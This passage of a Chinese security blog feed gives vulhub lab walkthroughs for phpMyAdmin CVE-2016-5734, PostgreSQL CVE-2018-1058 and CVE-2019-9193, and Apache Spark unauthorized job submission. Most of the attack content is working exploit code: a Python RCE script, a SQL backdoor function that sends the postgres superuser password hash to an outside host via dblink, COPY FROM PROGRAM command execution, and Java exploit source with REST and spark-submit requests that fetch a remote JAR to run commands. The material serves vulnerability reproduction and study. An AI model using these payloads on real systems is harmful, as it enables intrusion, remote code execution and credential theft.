punctuation">,</span> help<span class="token operator">=</span><span class="token string">"Password for valid PMA user"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-d"</span><span class="token punctuation">,</span> <span class="token string">"--dbs"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"Existing database at a server"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-T"</span><span class="token punctuation">,</span> <span class="token string">"--table"</span><span class="token punctuation">,</span> type<span class="token operator">=</span>str<span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">"Custom table name for exploit."</span><span class="token punctuation">)</span>    arguments <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    url_to_pma <span class="token operator">=</span> arguments<span class="token punctuation">.</span>url    uname <span class="token operator">=</span> arguments<span class="token punctuation">.</span>user    upass <span class="token operator">=</span> arguments<span class="token punctuation">.</span>pwd    <span class="token keyword">if</span> arguments<span class="token punctuation">.</span>dbs<span class="token punctuation">:</span>        db <span class="token operator">=</span> arguments<span class="token punctuation">.</span>dbs    <span class="token keyword">else</span><span class="token punctuation">:</span>        db <span class="token operator">=</span> <span class="token string">"test"</span>    token <span class="token operator">=</span> <span class="token boolean">False</span>    custom_table <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> arguments<span class="token punctuation">.</span>table<span class="token punctuation">:</span>        custom_table <span class="token operator">=</span> <span class="token boolean">True</span>        table <span class="token operator">=</span> arguments<span class="token punctuation">.</span>table    <span class="token keyword">else</span><span class="token punctuation">:</span>        table <span class="token operator">=</span> <span class="token string">"prgpwn"</span>    <span class="token keyword">if</span> arguments<span class="token punctuation">.</span>cmd<span class="token punctuation">:</span>        payload <span class="token operator">=</span> arguments<span class="token punctuation">.</span>cmd    <span class="token keyword">else</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"system('uname -a');"</span>    size <span class="token operator">=</span> <span class="token number">32</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># you can manually add proxy support it's very simple ;)</span>    <span class="token comment" spellcheck="true"># s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}</span>    s<span class="token punctuation">.</span>verify <span class="token operator">=</span> <span class="token boolean">False</span>    sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''CREATE TABLE `{0}` (      `first` varchar(10) CHARACTER SET utf8 NOT NULL    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));    '''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># get_token</span>    resp <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_to_pma <span class="token operator">+</span> <span class="token string">"/?lang=en"</span><span class="token punctuation">,</span> dict<span class="token punctuation">(</span>        pma_username<span class="token operator">=</span>uname<span class="token punctuation">,</span>        pma_password<span class="token operator">=</span>upass    <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token keyword">is</span> <span class="token number">200</span><span class="token punctuation">:</span>        token_place <span class="token operator">=</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"token="</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span>        token <span class="token operator">=</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">[</span>token_place<span class="token punctuation">:</span>token_place <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> token <span class="token keyword">is</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Cannot get valid authorization token."</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> custom_table <span class="token keyword">is</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"is_js_confirmed"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>            <span class="token string">"db"</span><span class="token punctuation">:</span> db<span class="token punctuation">,</span>            <span class="token string">"token"</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span>            <span class="token string">"pos"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>            <span class="token string">"sql_query"</span><span class="token punctuation">:</span> sql<span class="token punctuation">,</span>            <span class="token string">"sql_delimiter"</span><span class="token punctuation">:</span> <span class="token string">";"</span><span class="token punctuation">,</span>            <span class="token string">"show_query"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>            <span class="token string">"fk_checks"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>            <span class="token string">"SQL"</span><span class="token punctuation">:</span> <span class="token string">"Go"</span><span class="token punctuation">,</span>            <span class="token string">"ajax_request"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>            <span class="token string">"ajax_page_request"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>        resp <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_to_pma <span class="token operator">+</span> <span class="token string">"/import.php"</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> cookies<span class="token operator">=</span>requests<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>dict_from_cookiejar<span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"success"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"success"</span><span class="token punctuation">]</span> <span class="token keyword">is</span> <span class="token boolean">False</span><span class="token punctuation">:</span>                    first <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">[</span>resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;code>"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    error <span class="token operator">=</span> first<span class="token punctuation">[</span><span class="token punctuation">:</span>first<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;/code>"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>                    <span class="token keyword">if</span> <span class="token string">"already exists"</span> <span class="token keyword">in</span> error<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ERROR: "</span> <span class="token operator">+</span> error<span class="token punctuation">)</span>                        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># build exploit</span>    exploit <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"db"</span><span class="token punctuation">:</span> db<span class="token punctuation">,</span>        <span class="token string">"table"</span><span class="token punctuation">:</span> table<span class="token punctuation">,</span>        <span class="token string">"token"</span><span class="token punctuation">:</span> token<span class="token punctuation">,</span>        <span class="token string">"goto"</span><span class="token punctuation">:</span> <span class="token string">"sql.php"</span><span class="token punctuation">,</span>        <span class="token string">"find"</span><span class="token punctuation">:</span> <span class="token string">"0/e\0"</span><span class="token punctuation">,</span>        <span class="token string">"replaceWith"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>        <span class="token string">"columnIndex"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>        <span class="token string">"useRegex"</span><span class="token punctuation">:</span> <span class="token string">"on"</span><span class="token punctuation">,</span>        <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"Go"</span><span class="token punctuation">,</span>        <span class="token string">"ajax_request"</span><span class="token punctuation">:</span> <span class="token string">"true"</span>    <span class="token punctuation">}</span>    resp <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url_to_pma <span class="token operator">+</span> <span class="token string">"/tbl_find_replace.php"</span><span class="token punctuation">,</span> exploit<span class="token punctuation">,</span> cookies<span class="token operator">=</span>requests<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>dict_from_cookiejar<span class="token punctuation">(</span>s<span class="token punctuation">.</span>cookies<span class="token punctuation">)</span>    <span class="token punctuation">)</span>    <span class="token keyword">if</span> resp<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">[</span>resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"message"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;/a>"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>            <span class="token string">"Exploit failed!\n"</span>            <span class="token string">"Try to manually set exploit parameters like --table, --database and --token.\n"</span>            <span class="token string">"Remember that servers with PHP version greater than 5.4.6"</span>            <span class="token string">" is not exploitable, because of warning about null byte in regexp"</span>        <span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">./cve-2016-5734.py -c <span class="token string">'system(id);'</span> -u root -p root -d <span class="token function">test</span> http://your-ip:8080/</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200324095906.png-water_print" alt=""></p><p><code>-d</code> 是已经可以写的数据库，<code>-c</code> 是待执行的 PHP 语句，如果没有指定表名，这个 POC 会创建一个名为 <code>prgpwn</code> 的表。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> phpunit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PostgreSQL 提权漏洞（CVE-2018-1058）</title>
      <link href="/2019/03/03/postgresql-ti-quan-lou-dong/"/>
      <url>/2019/03/03/postgresql-ti-quan-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PostgreSQL-提权漏洞（CVE-2018-1058）"><a href="#PostgreSQL-提权漏洞（CVE-2018-1058）" class="headerlink" title="PostgreSQL 提权漏洞（CVE-2018-1058）"></a>PostgreSQL 提权漏洞（CVE-2018-1058）</h1><p>PostgreSQL 是一款关系型数据库。其 9.3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先通过普通用户 <code>vulhub:vulhub</code> 的身份登录 <code>postgres: psql --host your-ip --username vulhub</code></p><p>执行如下语句后退出：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> <span class="token keyword">public</span><span class="token punctuation">.</span>array_to_string<span class="token punctuation">(</span>anyarray<span class="token punctuation">,</span><span class="token keyword">text</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">TEXT</span> <span class="token keyword">AS</span> $$    <span class="token keyword">select</span> dblink_connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> passwd <span class="token keyword">FROM</span> pg_shadow <span class="token keyword">WHERE</span> usename<span class="token operator">=</span><span class="token string">'postgres'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">SELECT</span> pg_catalog<span class="token punctuation">.</span>array_to_string<span class="token punctuation">(</span>$<span class="token number">1</span><span class="token punctuation">,</span>$<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$$ <span class="token keyword">LANGUAGE SQL</span> VOLATILE<span class="token punctuation">;</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323103852.png-water_print" alt=""></p><p>然后我在 10.0.0.1 上监听 <code>2333</code> 端口，等待超级用户触发我们留下的这个 <code>后门</code>。</p><p>在靶场机器下，用超级用户的身份执行 <code>pg_dump</code> 命令：<code>docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</code>，导出 <code>vulhub</code> 这个数据库的内容。</p><p>执行上述命令的同时，<code>后门</code> 已被触发，<code>10.0.0.1</code> 机器上已收到敏感信息：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323104041.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> PostgreSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）</title>
      <link href="/2019/03/03/postgresql-gao-quan-xian-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/03/postgresql-gao-quan-xian-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）"><a href="#PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）" class="headerlink" title="PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）"></a>PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）</h1><p>PostgreSQL 是一款关系型数据库。其 9.3 到 11 版本中存在一处 <code>特性</code>，管理员或具有 <code>COPY TO/FROM PROGRAM</code> 权限的用户，可以使用这个特性执行任意命令。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>启动存在漏洞的环境：</p><pre class=" language-bash"><code class="language-bash">docker-compose up -d</code></pre><p>环境启动后，将开启 Postgres 默认的 5432 端口，默认账号密码为 <code>postgres/postgres</code>。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先连接到 postgres 中，并执行参考链接中的 POC：</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> cmd_exec<span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> cmd_exec<span class="token punctuation">(</span>cmd_output <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY cmd_exec <span class="token keyword">FROM</span> PROGRAM <span class="token string">'id'</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> cmd_exec<span class="token punctuation">;</span></code></pre><p><code>FROM PROGRAM</code> 语句将执行命令 <code>id</code> 并将结果保存在 <code>cmd_exec</code> 表中：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323103200.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> PostgreSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Spark 未授权访问漏洞</title>
      <link href="/2019/03/03/apache-spark-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2019/03/03/apache-spark-wei-shou-quan-fang-wen-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-Spark-未授权访问漏洞"><a href="#Apache-Spark-未授权访问漏洞" class="headerlink" title="Apache Spark 未授权访问漏洞"></a>Apache Spark 未授权访问漏洞</h1><p>Apache Spark 是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动 ACL（访问控制），我们将可以在集群中执行任意代码。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令，将以 <code>standalone</code> 模式启动一个 <code>Apache Spark</code> 集群，集群里有一个 <code>master</code> 与一个 <code>slave</code>：</p><pre><code>docker-compose up -d</code></pre><p>环境启动后，访问<a href="http://your-ip:8080" target="_blank" rel="noopener">http://your-ip:8080</a>即可看到 <code>master</code> 的管理页面，访问<a href="http://your-ip:8081" target="_blank" rel="noopener">http://your-ip:8081</a>即可看到 <code>slave</code> 的管理页面。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。</p><p>提交方式有两种：</p><ol><li>利用REST API</li><li>利用 submissions 网关（集成在 7077 端口中）<br>应用可以是 Java 或 Python，就是一个最简单的类</li></ol><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedReader<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStreamReader<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>    String<span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>String cmd <span class="token operator">:</span> cmds<span class="token punctuation">)</span> <span class="token punctuation">{</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">executeCommand</span><span class="token punctuation">(</span>cmd<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"=============================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// https://www.mkyong.com/java/how-to-execute-shell-command-from-java/</span>  <span class="token keyword">private</span> <span class="token keyword">static</span> String <span class="token function">executeCommand</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span> <span class="token punctuation">{</span>    StringBuilder output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>      Process p <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>      p<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      BufferedReader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      String line<span class="token punctuation">;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        output<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>      e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> output<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>将其编译成 JAR，放在任意一个 HTTP 或 FTP 上:</p><pre><code>https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar</code></pre><h3 id="用-REST-API-方式提交应用"><a href="#用-REST-API-方式提交应用" class="headerlink" title="用 REST API 方式提交应用:"></a>用 REST API 方式提交应用:</h3><p><code>standalone</code> 模式下，<code>master</code> 将在 <code>6066</code> 端口启动一个 HTTP 服务器，我们向这个端口提交 REST 格式的 API：</p><pre class=" language-http"><code class="language-http">POST /v1/submissions/create HTTP/1.1<span class="token header-name keyword">Host:</span> your-ip:6066<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Accept-Language:</span> en<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<span class="token header-name keyword">Content-Type:</span> application/json<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Length:</span> 680<span class="token application/json"><span class="token punctuation">{</span>  <span class="token string">"action"</span><span class="token punctuation">:</span> <span class="token string">"CreateSubmissionRequest"</span><span class="token punctuation">,</span>  <span class="token string">"clientSparkVersion"</span><span class="token punctuation">:</span> <span class="token string">"2.3.1"</span><span class="token punctuation">,</span>  <span class="token string">"appArgs"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">"whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"appResource"</span><span class="token punctuation">:</span> <span class="token string">"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar"</span><span class="token punctuation">,</span>  <span class="token string">"environmentVariables"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"SPARK_ENV_LOADED"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token string">"mainClass"</span><span class="token punctuation">:</span> <span class="token string">"Exploit"</span><span class="token punctuation">,</span>  <span class="token string">"sparkProperties"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">"spark.jars"</span><span class="token punctuation">:</span> <span class="token string">"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar"</span><span class="token punctuation">,</span>    <span class="token string">"spark.driver.supervise"</span><span class="token punctuation">:</span> <span class="token string">"false"</span><span class="token punctuation">,</span>    <span class="token string">"spark.app.name"</span><span class="token punctuation">:</span> <span class="token string">"Exploit"</span><span class="token punctuation">,</span>    <span class="token string">"spark.eventLog.enabled"</span><span class="token punctuation">:</span> <span class="token string">"true"</span><span class="token punctuation">,</span>    <span class="token string">"spark.submit.deployMode"</span><span class="token punctuation">:</span> <span class="token string">"cluster"</span><span class="token punctuation">,</span>    <span class="token string">"spark.master"</span><span class="token punctuation">:</span> <span class="token string">"spark://your-ip:6066"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></span></code></pre><p>其中，<code>spark.jars</code> 即是编译好的应用，<code>mainClass</code> 是待运行的类，<code>appArgs</code> 是传给应用的参数。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323100150.png-water_print" alt=""></p><p>返回的包中有 submissionId，然后访问 <a href="http://your-ip:8081/logPage/?driverId={submissionId}&amp;logType=stdout" target="_blank" rel="noopener">http://your-ip:8081/logPage/?driverId={submissionId}&amp;logType=stdout</a>，即可查看执行结果：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200323100312.png-water_print" alt=""></p><p>注意，提交应用是在 master 中，查看结果是在具体执行这个应用的 slave 里（默认8081端口）。实战中，由于slave可能有多个。</p><h3 id="利用-submissions-网关"><a href="#利用-submissions-网关" class="headerlink" title="利用 submissions 网关"></a>利用 submissions 网关</h3><p>如果 6066 端口不能访问，或做了权限控制，我们可以利用 master 的主端口 7077，来提交应用。</p><p>方法是利用 Apache Spark 自带的脚本 <code>bin/spark-submit</code>：</p><pre class=" language-bash"><code class="language-bash">bin/spark-submit --master spark://your-ip:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar <span class="token function">id</span></code></pre><p>如果你指定的 <code>master</code> 参数是 <code>rest</code> 服务器，这个脚本会先尝试使用 <code>rest api</code> 来提交应用；如果发现不是 <code>rest</code> 服务器，则会降级到使用 <code>submission gateway</code> 来提交应用。</p><p>查看结果的方式与前面一致。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Spark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</title>
      <link href="/2019/03/03/spring-data-commons-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/03/03/spring-data-commons-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
